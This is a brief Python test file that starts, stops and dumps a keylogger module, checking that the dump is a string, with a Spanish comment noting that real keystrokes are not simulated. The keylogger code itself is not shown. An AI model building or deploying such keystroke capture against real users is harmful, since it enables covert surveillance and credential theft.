import os
import time
from modules import keylogger

def test_keylogger_start_stop_dump():
    keylogger.run('start')
    time.sleep(1)
    keylogger.run('stop')
    keylog = keylogger.run('dump')
    assert isinstance(keylog, str)
    # Nota: No se puede simular tecla real sin interacción, esto solo chequea funcionamiento básico
